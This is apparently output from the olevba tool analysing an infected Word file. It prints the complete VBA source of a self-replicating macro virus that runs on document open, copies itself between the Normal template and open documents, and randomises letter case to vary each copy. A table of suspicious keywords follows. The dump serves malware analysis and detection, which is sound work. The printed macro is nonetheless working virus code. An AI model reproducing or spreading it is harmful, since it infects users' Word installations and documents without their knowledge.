olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Static-838f90b23d5e1a73915565730ef02a9f6bb75f61
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Static-838f90b23d5e1a73915565730ef02a9f6bb75f61 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub doCUMEnt_OpeN()
Options.VirusProtection = TRUE 
Options.SaveNormalPrompt = TRUE 
Options.ConfirmConversions = TRUE 
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TaRgetmOduLE = Target.VBProject.VbcOMPoneNTS.Item(1).COdeMODULE
TaRgetmOduLE.DeLEteliNeS 1, TaRgetmOduLE.cOunTofLINes
TaRgetmOduLE.ADdfrOmSTRinG morpH
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function morpH()
HOST = ThisDocument.VBProject.VbcOMPoneNTS.Item(1).COdeMODULE.Lines(1, ThisDocument.VBProject.VbcOMPoneNTS.Item(1).COdeMODULE.cOunTofLINes)
For V1 = 1 To Len(HOST)
V2 = Asc(Mid(HOST, V1, 1))
If V2 < 90 And V2 > 65 Then
If Int(Rnd * 11) > 5 Then V2 = V2 + 32
ElseIf V2 < 122 And V2 > 97 Then
If Int(Rnd * 11) > 5 Then V2 = V2 - 32
End If
morpH = morpH & Chr(V2)
Next
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |doCUMEnt_OpeN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbcOMPoneNTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|COdeMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADdfrOmSTRinG       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
